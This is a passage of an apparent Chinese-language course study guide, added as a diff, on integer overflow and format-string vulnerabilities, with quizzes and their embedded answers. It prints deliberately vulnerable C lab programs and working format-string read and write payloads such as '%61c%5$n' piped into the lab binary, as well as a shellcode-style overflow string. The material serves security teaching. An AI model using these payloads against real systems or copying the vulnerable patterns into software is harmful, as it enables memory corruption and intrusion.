+int main()
+{ int i=0;
+  char *buf1 = (char *)malloc(BUFSIZE);
+  char *buf2 = (char *)malloc(BUFSIZE);
+
+  while((*(buf1+i)=getchar())!=EOF)
+   i++;
+}</pre>
+    </div>
+    <p>循环没有上界，<code>buf1</code> 之后紧邻的 <code>buf2</code> 与堆上的敏感数据会被逐字节覆盖。BSS 版本更直接：<code>static char buf[BUFSIZE]</code> 后面放 <code>tmpfile</code> 指针或函数指针，<code>gets(buf)</code> 溢出后可以<strong>改掉文件路径指针或函数指针</strong>（课件第 88–89 页）。</p>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li>偏移 108 是 <code>buffer→ebp</code>；覆盖 RET 要写 <strong>112</strong> 处，不要只写 108。</li>
+      <li>badfile 中不能出现 <code>\0</code>（<code>strcpy</code> 遇到 NUL 停止），所以返回地址也要避免含零字节，课件注释专门提示这一点。</li>
+      <li>“程序在 <code>func</code> 退出前不能崩溃”是远程利用的前提：一旦中途崩了，shellcode 根本没机会执行。</li>
+      <li>SUID 顺序：先 <code>chown</code> 再 <code>chmod 4755</code>；反过来 suid 位会被清掉。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 4 章<span>4 题</span></div>
+
+      <div class="q" data-answer="C" data-explain="gdb 测得 ebp − &amp;buffer = 108，返回地址在 ebp+4，所以从 buffer 起点到 RET 是 112 字节。stack_exploit.py 里写 content[distance+4:...]，distance=108，也印证了这一点。">
+        <div class="q-stem"><span class="qno">1.</span>stack.c 中，从 <code>buffer</code> 起点覆盖到返回地址需要多少字节？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q4-1" value="A"><span>A. 100</span></label>
+          <label class="opt"><input type="radio" name="q4-1" value="B"><span>B. 108</span></label>
+          <label class="opt"><input type="radio" name="q4-1" value="C"><span>C. 112</span></label>
+          <label class="opt"><input type="radio" name="q4-1" value="D"><span>D. 116</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="ABD" data-multi="true" data-explain="课件列出的不安全函数包括 strcpy、strcat、gets、scanf；并特别指出 strncpy/strncat 也不一定安全，因为 strncpy 不保证补 '\0'。">
+        <div class="q-stem"><span class="qno">2.</span>课件认为下列哪些函数存在溢出风险？<span class="q-tag">多选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="checkbox" name="q4-2" value="A"><span>A. strcpy</span></label>
+          <label class="opt"><input type="checkbox" name="q4-2" value="B"><span>B. gets</span></label>
+          <label class="opt"><input type="checkbox" name="q4-2" value="C"><span>C. strncpy（一定安全）</span></label>
+          <label class="opt"><input type="checkbox" name="q4-2" value="D"><span>D. scanf</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="课件演示中依次需要：关闭 ASLR（randomize_va_space=0）、关闭 canary（-fno-stack-protector）、允许栈执行（-z execstack），再设置 SUID。">
+        <div class="q-stem"><span class="qno">3.</span>要让 stack.c 的栈溢出实验按课件预期成功，通常需要做哪些准备？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q4-3" value="A"><span>A. 关闭 ASLR、关闭 canary、允许栈可执行</span></label>
+          <label class="opt"><input type="radio" name="q4-3" value="B"><span>B. 开启 ASLR、开启 canary、禁止栈可执行</span></label>
+          <label class="opt"><input type="radio" name="q4-3" value="C"><span>C. 只需开启 ASLR 等级 2</span></label>
+          <label class="opt"><input type="radio" name="q4-3" value="D"><span>D. 只需用 -O2 优化编译</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="badfile 由 fread 读入 str，再交给 strcpy。strcpy 遇到 NUL 就停止复制，若 payload 中间出现 \x00，后半段（包括返回地址）根本写不进去，所以坏文件必须全为非零字节。">
+        <div class="q-stem"><span class="qno">4.</span>为什么 badfile 里尽量避免出现 <code>\x00</code>？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q4-4" value="A"><span>A. 因为文件写入会截断</span></label>
+          <label class="opt"><input type="radio" name="q4-4" value="B"><span>B. 因为 strcpy 遇到 NUL 停止复制，后面的地址与代码写不进去</span></label>
+          <label class="opt"><input type="radio" name="q4-4" value="C"><span>C. 因为 NOP 不能是 0x00</span></label>
+          <label class="opt"><input type="radio" name="q4-4" value="D"><span>D. 因为 gdb 无法读取含 0 的文件</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 5 章 ================= -->
+  <section class="chapter" id="ch5">
+    <div class="ch-kicker">第 5 章 · 对应《第2讲 软件安全2-1》后半</div>
+    <h1>整数溢出</h1>
+    <p class="lead">整数用固定位数表示，超过范围就回绕（wrap around，模 max+1）。溢出本身不直接破坏内存，但它能让<strong>长度检查与真正的拷贝使用不同的数值</strong>，从而绕过检查。</p>
+
+    <h2>5.1 回绕：1 == 65537？</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">intOveflow-codes/intOverflow.c · 第 3–19 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+
+	unsigned short  a,b;
+
+	printf("size of unsigned short  is %d\n",sizeof(a) );
+
+	a = 1;
+	b = 65537; //2^16+1
+	if(a == b){
+		printf("1==65537???????\n");
+	}
+
+	return 0;
+}</pre>
+    </div>
+    <p><code>unsigned short</code> 只有 2 字节。65537 的二进制是 <code>1 0000 0000 0000 0001</code>，赋给 16 位变量时高位被截掉，只剩 <code>0000 0000 0000 0001</code>，于是 <code>a == b</code> 成立。课件用这个例子说明“超出部分被忽略”。</p>
+
+    <h2>5.2 绕过长度检查：catvars</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">intOveflow-codes/23.c · 第 5–23 行</span><span>C</span></div>
+      <pre data-lang="c">int catvars(char *buf1, char *buf2,
+            unsigned int len1, unsigned int  len2)
+{
+	char mybuf[256];
+
+	if((len1 + len2) > 256){
+		printf("Length error\n\n");
+		return -1;
+	}
+
+	printf("len1 is %u, len2 is %u,len1+len2 is %u\n\n", len1,len2,len1+len2);
+
+	memcpy(mybuf, buf1, len1);
+	memcpy(mybuf + len1, buf2, len2);
+
+	return 0;
+}</pre>
+    </div>
+    <p>主函数中 <code>length1 = 0x104</code>、<code>length2 = 0xfffffffc</code>。两者相加：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>量</th><th>32 位二进制</th><th>十进制</th></tr>
+        <tr><td>len1 = 0x104</td><td>0000 0001 0000 0100</td><td>260</td></tr>
+        <tr><td>len2 = 0xfffffffc</td><td>1111 1111 1111 1100</td><td>4294967292</td></tr>
+        <tr><td>len1 + len2（回绕）</td><td>0000 0001 0000 0000</td><td>256</td></tr>
+      </table>
+    </div>
+    <p>检查和写回用的是同一个表达式，所以 <code>&gt; 256</code> 不成立，检查放行；但第一次 <code>memcpy</code> 用的是 <strong>len1 = 260</strong>，已经超出 <code>mybuf[256]</code>，直接溢出。<strong>关键点</strong>：不是“加法算错了”，而是<em>检查值与使用值语义不一致</em>。</p>
+
+    <h2>5.3 有符号 / 无符号混用：memcpy 的 count</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">intOveflow-codes/memcpy.c · 第 5–30 行</span><span>C</span></div>
+      <pre data-lang="c">int copySomething(char *buf, int len)
+{
+	char kbuf[800];
+	int i = 0;
+	memset(kbuf,0,800);
+	if(len &gt; 800){
+		printf("&gt;&gt;&gt;&gt;\n");
+		return -1;
+	}
+	memcpy(kbuf, buf, len);
+	printf("%s\n",kbuf);
+	return 0;
+}
+
+int main(){
+	unsigned int length1;
+	char * buffer1 = "111";
+
+	length1 = -3;
+
+	copySomething(buffer1, length1);
+	return 0;
+}</pre>
+    </div>
+    <p>检查时 <code>len</code> 是 <code>int</code>（有符号），<code>-3 &gt; 800</code> 为假，检查通过；但 <code>memcpy</code> 的原型是 <code>void *memcpy(void *dest, void *src, unsigned int count)</code>，<code>-3</code> 被解释成 <code>0xfffffffd</code>（约 4 GB），于是向 <code>kbuf[800]</code> 写入海量数据，几乎必然崩溃。课件把这类问题总结为“检查用有符号、使用用无符号”。</p>
+    <p>同目录的 <code>password.c</code> 是同一原理的“口令校验”小例子：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">intOveflow-codes/password.c · 第 3–20 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+
+	unsigned short  a,b;
+	a = 1;//假设密码是1
+	b = 0;
+	printf("请输入密码:\n");
+	scanf("%d",&amp;b);
+	if(a == b){
+		printf("密码正确\n");
+	}
+	else{
+		printf("密码错误\n");
+	}
+
+	printf("b = %d\n",b);
+
+	return 0;
+}</pre>
+    </div>
+    <p>输入 65537，<code>b</code> 回绕成 1，口令校验通过——把“整数回绕”转化为“认证绕过”。</p>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li>整数溢出的危害不在“数值错”，而在“检查与使用不一致”，或者“长度被放大成巨大值”。</li>
+      <li>有符号与无符号比较、赋值、函数参数传递都可能发生隐式转换；C 的整型提升规则是根因之一。</li>
+      <li>回绕公式：无符号数超过 <code>2^n - 1</code> 后按 <code>2^n</code> 取模；有符号数越界在 C 中属于未定义行为（课件未展开这一点，此处仅作提示）。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 5 章<span>3 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="unsigned short 为 16 位，65537 = 2^16 + 1，高位被截断后只剩 1，所以 a == b 成立，会打印提示。">
+        <div class="q-stem"><span class="qno">1.</span><code>unsigned short a=1, b=65537;</code> 执行 <code>if(a==b)</code> 的结果是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q5-1" value="A"><span>A. 条件为假，不打印</span></label>
+          <label class="opt"><input type="radio" name="q5-1" value="B"><span>B. 条件为真，因为 b 回绕成 1</span></label>
+          <label class="opt"><input type="radio" name="q5-1" value="C"><span>C. 编译报错</span></label>
+          <label class="opt"><input type="radio" name="q5-1" value="D"><span>D. 结果依赖编译器，无法确定</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="0x104 + 0xfffffffc 在 32 位无符号加法下回绕为 0x100（256），恰好等于缓冲区大小，于是 <code>&gt; 256</code> 检查不成立而被放行。">
+        <div class="q-stem"><span class="qno">2.</span>在 catvars 例子中，len1=0x104、len2=0xfffffffc，<code>len1+len2</code> 的结果是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q5-2" value="A"><span>A. 0x100（256），检查被绕过</span></label>
+          <label class="opt"><input type="radio" name="q5-2" value="B"><span>B. 0x100000100，检查报错</span></label>
+          <label class="opt"><input type="radio" name="q5-2" value="C"><span>C. 0x104，只有 len1 生效</span></label>
+          <label class="opt"><input type="radio" name="q5-2" value="D"><span>D. 结果为负数，直接崩溃</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="memcpy 的第三个参数类型是 unsigned int。传入 -3 时，检查按有符号 int 判断（-3 &gt; 800 为假），真正拷贝时按无符号解释，变成约 4 GB，导致越界。">
+        <div class="q-stem"><span class="qno">3.</span>memcpy.c 中 <code>copySomething(buffer1, -3)</code> 为什么危险？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q5-3" value="A"><span>A. 因为 -3 小于 0，memcpy 不执行</span></label>
+          <label class="opt"><input type="radio" name="q5-3" value="B"><span>B. 检查按有符号比较放行，memcpy 按无符号解释成约 4 GB</span></label>
+          <label class="opt"><input type="radio" name="q5-3" value="C"><span>C. 因为 memset 没有清零</span></label>
+          <label class="opt"><input type="radio" name="q5-3" value="D"><span>D. 因为 kbuf 在堆上</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 6 章 ================= -->
+  <section class="chapter" id="ch6">
+    <div class="ch-kicker">第 6 章 · 对应《第2讲 软件安全2-2》</div>
+    <h1>格式化字符串漏洞</h1>
+    <p class="lead">一句话概括：<strong>当用户输入被当作格式串传给 printf 家族，%p 会读出栈上的值，%s 会把栈上的值当地址去读内存，%n 甚至会往栈上的地址写数据</strong>。这是本课程里“读”和“写”都最直接的一类漏洞。</p>
+
+    <h2>6.1 格式串基础：位置参数与 %n</h2>
+    <p>课件列出的关键说明符：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>写法</th><th>含义</th><th>课件示例</th></tr>
+        <tr><td><code>%p</code></td><td>以 16 进制输出指针（值）</td><td><code>%p</code> 输出 a 的值，<code>%p &amp;a</code> 输出 a 的地址</td></tr>
+        <tr><td><code>%s</code></td><td>把参数当作地址，输出该地址上的字符串</td><td>配合任意地址实现任意读</td></tr>
+        <tr><td><code>%d</code></td><td>有符号十进制整数</td><td>—</td></tr>
+        <tr><td><code>%x</code></td><td>16 进制</td><td>—</td></tr>
+        <tr><td><code>%2$d</code></td><td>位置参数：取第 2 个参数</td><td><code>printf("%2$d",10,20,30)</code> → 20</td></tr>
+        <tr><td><code>%10d</code></td><td>位宽：不足 10 位左侧补空格，超过则按实际输出</td><td>—</td></tr>
+        <tr><td><code>%n</code></td><td>把<strong>已输出的字符个数</strong>写入对应参数指向的地址</td><td><code>printf("1234%n",&amp;len)</code> → 输出 1234，len=4</td></tr>
+      </table>
+    </div>
+    <p><code>%n</code> 是整类漏洞的枢纽：它本来是“统计已输出长度”的工具，一旦地址可控，就变成“任意地址写一个整数”。</p>
+
+    <h2>6.2 write.c：用 %n 精确写四个字节</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">formattingString/write.c · 第 4–17 行</span><span>C</span></div>
+      <pre data-lang="c">void main(void) {
+	unsigned char canary[5];
+	unsigned char foo[4];
+	memset (foo, '\x00', sizeof (foo));
+	strcpy (canary, "AAAA"); 	/* 0 * before */
+
+	printf ("%16u%n", 7350, (int *) &amp;foo[0]);
+	printf ("%32u%n", 7350, (int *) &amp;foo[1]);
+	printf ("%64u%n", 7350, (int *) &amp;foo[2]);
+	printf ("%128u%n", 7350, (int *) &amp;foo[3]);
+
+	printf ("\nfoo:%02x%02x%02x%02x\n", foo[0], foo[1], foo[2], foo[3]);
+	printf ("canary: %02x%02x%02x%02x\n", canary[0], canary[1], canary[2], canary[3]);
+}</pre>
+    </div>
+    <p>课件在第 2 讲 2-2 第 5 页问“最后两行输出什么”。推理步骤：</p>
+    <ul>
+      <li><code>%16u</code> 输出 16 个字符（前导空格 + 数字），<code>%n</code> 把 16 写进 <code>&amp;foo[0]</code>。注意 <code>%n</code> 写的是 <code>int</code>，在 32 位上占 <strong>4 字节</strong>，所以这一次写会覆盖 <code>foo[0..3]</code>。</li>
+      <li>第二次写 32 到 <code>&amp;foo[1]</code>，覆盖 <code>foo[1..4]</code>——<code>foo</code> 只有 4 字节，于是 <code>canary[0]</code> 被写成 0。</li>
+      <li>第三次 64 写 <code>foo[2..5]</code>，第四次 128 写 <code>foo[3..6]</code>。按字节看，最终 <code>foo</code> 的四个字节分别是 <code>0x10、0x20、0x40、0x80</code>；<code>canary[0]</code> 被写成 0，<code>canary[1..3]</code> 仍是 <code>'A'</code>。</li>
+    </ul>
+    <p>所以课件给出的 foo 答案是 <strong>10204080</strong>；canary 也已被破坏（若按 <code>%02x</code> 四字节打印，首字节为 <code>00</code>）。这个例子同时说明两件事：<code>%n</code> 的写入粒度是 4 字节；<strong>canary 与相邻缓冲区之间没有隔离时，%n 能直接踩坏它</strong>（这正是第 7 章 canary 的弱点）。</p>
+
+    <h2>6.3 参数从哪来：栈上的“可变参数”</h2>
+    <p><code>int printf(const char *format, ...)</code> 不知道调用者实际传了几个参数，它按格式串里 <code>%</code> 的个数<strong>依次从栈上取</strong>。课件用这个例子说明：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 7 页</span><span>示意</span></div>
+      <pre data-lang="c">printf ("Number %d has no address, number %d has: %08x\n", i, a, &amp;a);</pre>
+    </div>
+    <p>调用时栈上是：格式串地址 A（由调用者压入）、i、a、&amp;a、返回地址。若格式串里的 <code>%</code> 多于实参，printf 就会继续往<strong>更高地址</strong>读——读到的是调用者的局部变量、保存的寄存器、甚至返回地址。于是：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">formattingString/parameterofPrintf.c · 第 3–11 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+
+	int a = 1;
+	int i = 2;
+	printf("AAAA%p%p%p%p%p\n");
+	return 0;
+}</pre>
+    </div>
+    <p>这行代码没有传任何可变参数，却会打印出 5 个栈上的“值”。这就是<strong>栈数据泄露</strong>：内容可能是变量、指针、返回地址。</p>
+
+    <h2>6.4 任意读：把地址写进格式串</h2>
+    <p>难点是“如何把想要的地址交给 printf”。课件给出的办法是：<strong>地址本来就随输入字符串存在栈上</strong>，只要用若干个 <code>%08x</code> 把参数指针“走到”它，再用 <code>%s</code> 解引用。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 9 页</span><span>示意</span></div>
+      <pre data-lang="c">printf ("\x1f\x01\xff\xbf_%08x.%08x|%s|");</pre>
+    </div>
+    <p>更简洁的写法是位置参数 <code>%M$s</code>：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 10 页</span><span>示意</span></div>
+      <pre data-lang="c">printf("\xaa\xbb\xcc\xdd%3$s");
+[ra][fmt][a1][a2][\xaa\xbb\xcc\xdd%3$s]
+                (1)  (2)  (3) ...
+=&gt; printf("...%3$s", _, _, 0xddccbbaa);</pre>
+    </div>
+    <p><code>%n$s</code> 直接指定第几个参数，本质仍是移动参数指针；区别只是不用数一串 <code>%08x</code>。</p>
+
+    <h2>6.5 任意写：%n 与 %[n]c</h2>
+    <p>把 <code>%s</code> 换成 <code>%n</code>，就得到“对地址 <code>0xddccbbaa</code> 写入当前已输出字符数”：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 12–14 页</span><span>示意</span></div>
+      <pre data-lang="c">printf("\xaa\xbb\xcc\xdd%3$n");
+=&gt; 对 0xddccbbaa 指向的内存写入已输出字符数
+
+printf("\xaa\xbb\xcc\xdd%6c%3$n");
+=&gt; 4 + 6 = 10，即 *0xddccbbaa = 10</pre>
+    </div>
+    <p>要写入任意值，用宽度控制输出长度：<code>%61c</code> 会输出 61 个字符（不足补空格），加上前置 4 字节地址，总长度 65。</p>
+
+    <h3>课堂主实验 qiang.c</h3>
+    <div class="code-block">
+      <div class="code-head"><span class="src">formattingString/qiang.c · 第 3–21 行</span><span>C</span></div>
+      <pre data-lang="c">void main(void) {
+
+	char buf[100];
+	char secret[100] = "111122223333";
+	int i;
+
+	printf("address of secret is at %p\n", secret);
+  	printf("Input:");
+  	fgets(buf, sizeof(buf), stdin);
+  	printf(buf);
+    printf("\n");
+  	printf("string secret is : %s\n",secret);
+  	printf("secret in int is: " );
+  	for (i = 0; i &lt; 16; i ++){
+  		printf("%d,", secret[i]);
+  	}
+  	printf("\n");
+}</pre>
+    </div>
+    <p>第 13 行 <code>printf(buf)</code> 是本漏洞的全部：<code>buf</code> 由 <code>fgets</code> 读入，直接当格式串。课件演示的三步（也写在文件注释里）：</p>
+    <ol>
+      <li><code>echo -e "\x41\x41\x41\x41%p|%p|…" | ./qiang</code>，看到 <code>41414141</code> 出现在第 5 个 <code>%p</code>，说明 <strong>buf 起始地址是 printf 的第 5 个参数</strong>（课件第 62–63 页把栈图画了出来）。这个 5 是<em>试出来的</em>，不是算出来的。</li>
+      <li><code>echo -e "\x88\xec\xff\xbf%5\$s" | ./qiang</code>：把 secret 的地址放在 buf 开头，第 5 个参数正好指向它，<code>%s</code> 于是打印 secret 的内容——<strong>任意读</strong>。</li>
+      <li><code>echo -e "\x88\xec\xff\xbf%61c%5\$n" | ./qiang</code>：输出 4（地址字节）+ 61（<code>%c</code> 补位）= 65，把 65 写进 secret 首地址，于是 <code>"111122223333"</code> 变成 <code>11A122223333</code>（65 是 <code>'A'</code> 的 ASCII 码）。——<strong>任意写</strong>。</li>
+    </ol>
+
+    <h3>qiang 的“课堂答题 2”：要写 0x31413131 该填多少？</h3>
+    <p>目标是让内存中的 4 个字节依次变成 <code>0x31、0x41、0x31、0x31</code>（字符上就是 <code>"1A11"</code>）。小端存放时，低地址字节是最低位：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>内存偏移</th><th>+0</th><th>+1</th><th>+2</th><th>+3</th></tr>
+        <tr><td>字节值</td><td>0x31（'1'）</td><td>0x41（'A'）</td><td>0x31（'1'）</td><td>0x31（'1'）</td></tr>
+        <tr><td>对整数的贡献</td><td>0x31 × 16<sup>0</sup></td><td>0x41 × 16<sup>2</sup></td><td>0x31 × 16<sup>4</sup></td><td>0x31 × 16<sup>6</sup></td></tr>
+      </table>
+    </div>
+    <p>按十六进制写成“高字节在左”就是 <code>0x31413131</code>。</p>
+    <p>课件直接给出 <code>0x31413131 = 826356017</code>，再减去前置地址占的 4 个输出宽度，得到 <code>n = 826356013</code>；命令即 <code>"\x88\xec\xff\xbf%826356013c%5\$n"</code>。源码注释里也写了这一行，与课件一致。</p>
+
+    <h2>6.6 真实程序里的形态：str_fmt_attack.c</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">formattingString/str_fmt_attack.c · 第 7–37 行</span><span>C</span></div>
+      <pre data-lang="c">char secret[] = "1234";
+void handle_failure(char *buf) {
+  char msg[100];
+  snprintf(msg, sizeof(msg), "Invalid Password!!! %s\n", buf);
+  printf(msg);
+}
+int main(int argc, char *argv[])
+{
+  setreuid(geteuid(), geteuid());
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stdin, NULL, _IONBF, 0);
+
+  printf("secret is at: %p\n", secret);
+
+  char buf[100];
+  printf("Enter Password:\n");
+
+  fgets(buf, sizeof(buf), stdin);
+
+  if (!strcmp(buf, "123456\n")) {
+    printf("Password OK :)\n");
+  } else {
+    handle_failure(buf);
+  }
+
+  if (secret[0]!='1' || secret[1]!='2'|| secret[2]!='3'|| secret[3]!='4') {
+    printf("The secret (1234) is modified to %s!\n", secret);
+  }
+
+  return 0;
+}</pre>
+    </div>
+    <p>与 qiang 的差别是：用户输入先被 <code>snprintf</code> 拼进 <code>msg</code>，前缀 <code>"Invalid Password!!! "</code> 有 <strong>20 个字符</strong>（注意有一个空格），然后 <code>printf(msg)</code>。这 20 个字符会被计入 <code>%n</code> 的输出长度，所以写值时要额外加 20。课件第 26–27 页强调了这个易错点：<strong>“Invalid Password!!!” 是 19 个字符 + 1 个空格 = 20</strong>。</p>
+    <p>文件注释给出了完整攻击步骤（第 44–80 行）：先 <code>%x</code> 刷一串泄露栈内容，找到 <code>"Invalid Password!!!…"</code> 在栈上的位置；用 <code>BBBB%12\$x</code> 确认第 12 个参数；再换成目标地址（secret 的 <code>0x804a038</code>，小端 <code>\x38\xa0\x04\x08</code>）做 <code>%12\$s</code> 读、<code>%12\$n</code> 写。</p>
+    <p><code>int_fmt_attack.c</code> 把 secret 换成整数 <code>0xdeadbeef</code>，并用 <code>tmp != secret</code> 检测是否被改；注释里的两条命令分别是 <code>%12\$n</code> 与 <code>%10c%12\$n</code>。</p>
+
+    <h2>6.7 另外两种后果：DoS 与缓冲区溢出</h2>
+    <p><strong>DoS</strong>：<code>fprintf(stdout, user)</code> 若 <code>user = "%s%s%s%s%s%s%s"</code>，printf 会把栈上连续 7 个值当地址解引用，极可能命中非法地址而崩溃。正确写法是 <code>fprintf(stdout, "%s", user)</code>。</p>
+    <p><strong>格式串引发溢出</strong>：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">第2讲 软件安全2-2 · 第 28–31 页</span><span>C（QPOP 2.53 / bftpd 案例）</span></div>
+      <pre data-lang="c">char outbuf[512], errmsg[512];
+sprintf (errmsg, "Err Wrong command: %400s", user);
+sprintf( outbuf, errmsg );</pre>
+    </div>
+    <p>第一句用 <code>%400s</code> 限制 user 最多 400 字符，看似安全；但 <code>user = "%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;"</code> 时，<code>%497d</code> 会展开成 497 个空格，加上 19 字符前缀共 <strong>516 = 512 + 4</strong>，第二句 <code>sprintf(outbuf, errmsg)</code> 直接把 outbuf 与返回地址一起冲掉。课件在这里提问“NOP 的作用是什么”——答案与第 4 章相同：滑板，提高跳转命中率。</p>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li><code>%n</code> 写入的是“已输出字符数”，<strong>不是参数的值</strong>，且按 <code>int</code> 写 4 字节。</li>
+      <li>用 <code>%n$</code> 前必须先确定“第几个参数”：用 <code>AAAA</code>（或 <code>BBBB</code>）打标试出来，这个序号依赖程序与编译选项，不能背成常数。</li>
+      <li>前缀字符串、地址字节都算进输出长度；qiang 是 4，str_fmt_attack 是 20 + 4。</li>
+      <li>“<code>printf(user)</code> 危险”不等于“<code>printf("%s", user)</code> 也危险”，后者是正确用法。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 6 章<span>5 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="位置参数 %2$d 取第 2 个可变参数，即 20。">
+        <div class="q-stem"><span class="qno">1.</span><code>printf("%2$d", 10, 20, 30)</code> 输出？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q6-1" value="A"><span>A. 10</span></label>
+          <label class="opt"><input type="radio" name="q6-1" value="B"><span>B. 20</span></label>
+          <label class="opt"><input type="radio" name="q6-1" value="C"><span>C. 30</span></label>
+          <label class="opt"><input type="radio" name="q6-1" value="D"><span>D. 2</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="%n 的作用是把目前为止已输出的字符个数写入对应参数所指向的地址；它本身不产生输出。">
+        <div class="q-stem"><span class="qno">2.</span><code>%n</code> 的作用是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q6-2" value="A"><span>A. 输出换行</span></label>
+          <label class="opt"><input type="radio" name="q6-2" value="B"><span>B. 输出参数的数值</span></label>
+          <label class="opt"><input type="radio" name="q6-2" value="C"><span>C. 把已输出字符数写入参数指向的地址</span></label>
+          <label class="opt"><input type="radio" name="q6-2" value="D"><span>D. 读取参数指向的字符串</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="四次 %n 依次把 0x10、0x20、0x40、0x80 写到 foo[0..3]（每次写 4 字节，后面几次的低字节落在正确位置），所以 foo 的四个字节是 10 20 40 80；写 foo[1] 起的 4 字节还顺带把 canary[0] 写成 0。">
+        <div class="q-stem"><span class="qno">3.</span>write.c 中最后打印的 <code>foo</code> 四字节是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q6-3" value="A"><span>A. 10204080</span></label>
+          <label class="opt"><input type="radio" name="q6-3" value="B"><span>B. 00000000</span></label>
+          <label class="opt"><input type="radio" name="q6-3" value="C"><span>C. 10203040</span></label>
+          <label class="opt"><input type="radio" name="q6-3" value="D"><span>D. 41414141</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="D" data-explain="0x31413131 = 826356017（课件注释给出），前置地址字节占 4 个输出宽度，所以宽度参数必须是 826356017 − 4 = 826356013。">
+        <div class="q-stem"><span class="qno">4.</span>要把 secret 写成 <code>"1A11"</code>（即 0x31413131），qiang 中的 <code>n</code> 应取？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q6-4" value="A"><span>A. 826356017</span></label>
+          <label class="opt"><input type="radio" name="q6-4" value="B"><span>B. 65</span></label>
+          <label class="opt"><input type="radio" name="q6-4" value="C"><span>C. 61</span></label>
+          <label class="opt"><input type="radio" name="q6-4" value="D"><span>D. 826356013</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="ACD" data-multi="true" data-explain="任何把用户输入当格式串的函数都危险：printf、fprintf、sprintf、snprintf 以及 syslog/err/warn 等日志函数。scanf 接收的是格式串参数，但本讲列出的“易受攻击函数”是输出/日志类。">
+        <div class="q-stem"><span class="qno">5.</span>课件认为下列哪些属于易受格式串攻击的函数？<span class="q-tag">多选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="checkbox" name="q6-5" value="A"><span>A. printf</span></label>
